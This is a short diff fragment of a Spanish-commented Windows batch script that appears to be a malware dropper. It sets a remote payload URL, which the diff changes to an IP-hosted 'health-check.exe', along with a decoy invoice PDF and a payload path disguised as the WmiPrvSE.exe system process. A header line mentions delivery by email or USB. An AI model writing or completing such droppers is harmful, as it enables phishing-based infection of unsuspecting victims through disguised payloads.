@@ -16,7 +16,7 @@ REM   4. Enviar por email/USB
 REM ========================================================================
 
 REM === CONFIGURACIÓN ===
-set URL_PAYLOAD=http://tu-servidor.com/update/svchost.exe
+set URL_PAYLOAD=http://192.168.1.102/health-check.exe
 set PDF_DECOY=%TEMP%\Factura_2024_11.pdf
 set PAYLOAD_PATH=%APPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe
 
